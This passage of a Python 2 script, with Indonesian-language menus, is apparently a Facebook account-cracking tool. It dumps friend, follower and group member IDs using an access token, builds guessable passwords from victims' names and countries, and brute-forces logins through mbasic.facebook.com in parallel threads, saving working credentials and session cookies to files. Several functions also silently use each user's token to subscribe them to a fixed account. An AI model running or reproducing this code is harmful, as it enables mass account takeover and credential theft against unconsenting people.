        except IOError:
                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
                os.system('rm -rf ___bangsat___')
                time.sleep(2)
                login()
        try:
                idt = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Profil ID :\x1b[1;96m ")
                file = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
                try:
                        req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                        op = json.loads(req.text)
                        print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama : \x1b[1;96m"+op["name"])
                except KeyError:
                        print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Profil Tidak Ditemukan')
                        raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                        menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=9999999")
                id = []
                z=json.loads(r.text)
                fle = open(file , 'a')#.replace(" ","_")
                for a in z['friends']['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        fle.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s \x1b[1;92mID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                fle.close()
                print("\r\x1b[1;97m                     ")
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m "+file)
                raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                menu()

        except KeyError:
                print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Follower')
                raw_input('\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}')
                menu()
	except requests.exceptions.ConnectionError:
		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
def teman():
        try:
                token=open('___bangsat___','r').read()
        except IOError:
                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
                os.system('rm -rf ___bangsat___')
                time.sleep(2)
                login()
        try:
		file = raw_input("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;97m Nama File :\x1b[1;96m ")
                try:
                   r=requests.get("https://graph.facebook.com/me/friends?access_token="+token+"&limit=99999999");requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                except KeyError:
                        print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Teman')
                        raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                        menu()
                id = []
                z=json.loads(r.text)
                fle = open(file , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        fle.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;92m ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                fle.close()
		print("\r\x1b[1;97m                   ")
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Tersimpan :\x1b[1;93m "+file)
                raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                menu()
	except requests.exceptions.ConnectionError:
		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
def menu():
	global ip, region, org
	try:
		token=open('___bangsat___','r').read()
	except IOError:
		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid")
		os.system('rm -rf ___bangsat___')
		time.sleep(2)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=' +token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
	except KeyError:
		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid")
		os.system('rm -rf ___bangsat___')
		time.sleep(2)
		login()
	except requests.exceptions.ConnectionError:
		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
	os.system("clear")
	print(logo)
	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Name : "+nama)
	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Ip : "+ip)
	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Org : "+org)
	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Region : "+region)

	print("\n\x1b[1;97m[\x1b[1;96m1\x1b[1;97m]\x1b[1;96m Crack Instagram (without login)")
	print("\x1b[1;96m[\x1b[1;97m2\x1b[1;96m]\x1b[1;97m Dump ID Publik (dump fast/slow)")
	print("\x1b[1;96m[\x1b[1;97m3\x1b[1;96m]\x1b[1;97m Dump ID From Query (dump slow)")
	print("\x1b[1;96m[\x1b[1;97m4\x1b[1;96m]\x1b[1;97m Dump ID From Pesan (dump slow)")
	print("\x1b[1;96m[\x1b[1;97m5\x1b[1;96m]\x1b[1;97m Dump ID Like Post (dump fast)")
	print("\x1b[1;96m[\x1b[1;97m6\x1b[1;96m]\x1b[1;97m Dump ID From Grup (dump slow)")
	print("\x1b[1;96m[\x1b[1;97m7\x1b[1;96m]\x1b[1;97m Dump ID Follower (dump fast)")
	print("\x1b[1;96m[\x1b[1;97m8\x1b[1;96m]\x1b[1;97m Dump ID Teman (dump fast)")
	print("\x1b[1;97m[\x1b[1;92m9\x1b[1;97m]\x1b[1;92m Start Crack (crack fast)")
	print("\x1b[1;97m[\x1b[1;93m10\x1b[1;97m]\x1b[1;93m Cek Opsi Checkpoint")
	print("\x1b[1;96m[\x1b[1;97m11\x1b[1;96m]\x1b[1;97m Lihat Hasil Crack")
	print("\x1b[1;96m[\x1b[1;97m12\x1b[1;96m]\x1b[1;97m Report Bug")
	print("\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;91m Remove Cookie")
	daftar_menu()
def daftar_menu():
	pilih = raw_input("\n\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;96m ")
	if pilih == "":
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
	elif pilih == "1":
		menu_instagram()
	elif pilih == "2":
		fst_slw = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Dump fast/slow (f/s) :\x1b[1;96m ")
		if fst_slw == "":
			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
		elif fst_slw == "f" or fst_slw == "F":
			publik_fast()
		elif fst_slw == "s" or fst_slw == "S":
			friendlist(basecookie())
		else:
			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
	elif pilih == "3":
		dumpfl()
		exit()
	elif pilih == "4":
		dump_message(basecookie())
	elif pilih == "5":
		like_post()
	elif pilih == "6":
		dump_grup(basecookie())
	elif pilih == "7":
		follower()
	elif pilih == "8":
		teman()
	elif pilih == "9":
		crack()
	elif pilih == "10":
		cek_opsi()
	elif pilih == "11":
		print("\x1b[1;96m[\x1b[1;97m1\x1b[1;96m]\x1b[1;97m Lihat Hasil\x1b[1;92m Ok")
		print("\x1b[1;96m[\x1b[1;97m2\x1b[1;96m]\x1b[1;97m Lihat Hasil\x1b[1;93m Cp")
		print("\x1b[1;96m[\x1b[1;97m0\x1b[1;96m]\x1b[1;97m Kembali")
		lihat = raw_input("\n\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;96m ")
		if lihat == "":
			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
		elif lihat == "1":
			try:
				live=open('Live.txt','r').read()
			except IOError:
				exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Hasil Ok Tidak Ada")
			print("\x1b[1;92m"+live)
			exit()
		elif lihat == "2":
			try:
                                chek=open('Check.txt','r').read()
                        except IOError:
                                exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Hasil Cp Tidak Ada")
                        print("\x1b[1;93m"+chek)
			exit()
		elif lihat == "0":
			menu()
		else:
			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
	elif pilih == "12":
		print("\x1b[1;92m[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Anda Akan Diarahkan Ke Whatsapp")
		time.sleep(3)
		os.system("xdg-open https://wa.me/6285727173376?text=Hallo%20Bang%20Rozhak")
		exit()
	elif pilih == "00":
		try:
			print("\x1b[1;93m[\x1b[1;97m*\x1b[1;93m]\x1b[1;97m Menghapus Cookie & Token")
			os.remove("___bangsat___")
			os.remove("_____bangsat_____")
		except Exception as e:
			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
	else:
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
def generate(text):
	global country
	results=[]
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==1 or len(i)==2 or len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(text)
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				if "Indonesia" in country:
					results.append("bismillah")
                                        results.append("sayang")
				if "Pakistan" in country:
					results.append("pakistan")
					results.append("786786")
				if "Bangladesh" in country:
					results.append("bangladesh")
					results.append("102030")
	return results
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
class crack:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input("\n\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Gunakan Password Manual (y/t) :\x1b[1;92m ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
					continue
				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Contoh Password :\x1b[1;92m Sayang,Bangsat,123456")
				self.pwlist()
				break
			elif f=="t":
				try:
					while True:
						try:
							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
					continue
				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")
				break
	def pwlist(self):
		self.pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;92m ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\x1b[1;92m[Ok] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Live.txt").read():
						break
					else:
						open("Live.txt","a+").write(
						"%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					try:
						token=open('___bangsat___','r').read()
						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+token)
						w=json.loads(q.text)
						bt=w["birthday"]

					except (KeyError, IOError):
		                         bt = "         "
					except:pass
					print("\r\x1b[1;93m[Cp] "+(fl.get("id")+"|"+i+" "+bt+" "))
					self.cp.append("%s|%s %s"%(fl.get("id"),i,bt))
					open("Check.txt","a+").write(
						"%s|%s %s\n"%(fl.get("id"),i,bt))
					break
				else:continue

			self.ko+=1
			print "\r\x1b[1;97m[Crack] %s/%s Ok:%s - Cp:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)

if __name__=='__main__':
	os.system('git pull')
	cek_cookie()
